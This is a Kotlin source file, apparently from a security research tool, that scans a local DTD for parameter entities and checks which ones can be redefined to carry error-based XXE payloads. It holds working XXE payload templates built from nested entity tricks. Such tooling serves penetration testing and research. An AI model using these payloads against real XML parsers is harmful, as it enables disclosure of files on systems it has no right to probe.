
import com.sun.org.apache.xerces.internal.impl.Constants
import com.sun.org.apache.xerces.internal.impl.dtd.*
import javax.xml.parsers.DocumentBuilderFactory

import org.xml.sax.InputSource;
import com.sun.org.apache.xerces.internal.util.SAXInputSource;
import org.xml.sax.ErrorHandler
import org.xml.sax.SAXParseException
import java.io.*

class EntityTester {

    fun inspectDtd(dtdStream: InputStream): ArrayList<String> {
        val inputSource = InputSource(InputStreamReader(dtdStream))
        val source = SAXInputSource(inputSource)
        val d = XMLDTDLoader()

//    source.inputSourcexmlReader.entityResolver = EntityResolver {
//        publicId:String, systemId:String ->
//
//        println(publicId)
//        null
//    }

        val g = d.loadGrammar(source) as DTDGrammar

        //g.printElements()

        //Elements
//    var elementDeclIndex = 0
//    val elementDecl = XMLElementDecl()
//    while (g.getElementDecl(elementDeclIndex++, elementDecl)) {
//
//        println(elementDecl.name.rawname)
//        //println(elementDecl.contentModelValidator.toString());
//    }
//
//    //Attributes
//    var attDeclIndex = 0
//    val attDecl = XMLAttributeDecl()
//    while (g.getAttributeDecl(attDeclIndex++, attDecl)) {
//
//        println(attDecl.name.rawname)
//    }

        val entitiesFound = ArrayList<String>()

        //Entities
        var entityIndex = 0
        val entityDecl = XMLEntityDecl()
        while (g.getEntityDecl(entityIndex++, entityDecl)) {
            entitiesFound.add(entityDecl.name)
            //println(entityDecl.name)
        }
        return entitiesFound
    }

    fun findInjectableEntity(dtdFullPath:String, listEntities:ArrayList<String>) {

        val factory = DocumentBuilderFactory.newInstance()
        val builder = factory.newDocumentBuilder()
        //The parser will likely logged to the console Fatal error .. We can disable all this for cleaner output
        builder.setErrorHandler(
                object : ErrorHandler {
                    override fun warning(exception: SAXParseException?) {
                    }

                    override fun error(exception: SAXParseException?) {
                    }

                    override fun fatalError(exception: SAXParseException?) {
                    }

                }
        )




        println("Testing ${listEntities.size} ($listEntities)")

        for(entity in listEntities) {
            val entityName = entity.replace("%","")
            //val xmlFile = String().javaClass.getResourceAsStream("/input.xml")
            val magicValue = "INJECTION_12345"

            val payloadParentheses = """
        <!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">

    <!ENTITY % $entityName 'aaa)>
        <!ENTITY &#x25; suffix "$magicValue">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///injectiontest/&#x25;suffix;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
"""
            val payloadQuotes = """
        <!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">

    <!ENTITY % $entityName '>
        <!ENTITY &#x25; suffix "$magicValue">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///injectiontest/&#x25;suffix;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa "bb"'>

    %local_dtd;
]>
"""
            val payloadNothing = """
        <!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///$dtdFullPath">

    <!ENTITY % $entityName '
        <!ENTITY &#x25; suffix "$magicValue">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///injectiontest/&#x25;suffix;&#x27;>">
        &#x25;eval;
        &#x25;error;
        '>

    %local_dtd;
]>
"""

            val payloads = arrayOf(payloadParentheses,payloadQuotes,payloadNothing)

            for (payload in payloads) {
                //println(" [-] Entity name: $entityName")

                try {
                    builder.parse(ByteArrayInputStream(payload.toByteArray(Charsets.UTF_8)))
                } catch (e: FileNotFoundException) {
                    if (e.message!!.contains(magicValue)) {
                        println(" [+] The entity $entity is injectable")
                        //println("Payload used:")
                        //println(payload)
                    }
                } catch (e: Exception) {
                    //Failed
                    //println(" [!] $e.message")
                }
            }
        }


        //val entries = doc.getElementsByTagName("*")

//    for (i in 0 until entries.length) {
//        val element = entries.item(i) as Element
//        System.out.println("Found element " + element.getNodeName() + element.textContent)
//
//    }
    }

}
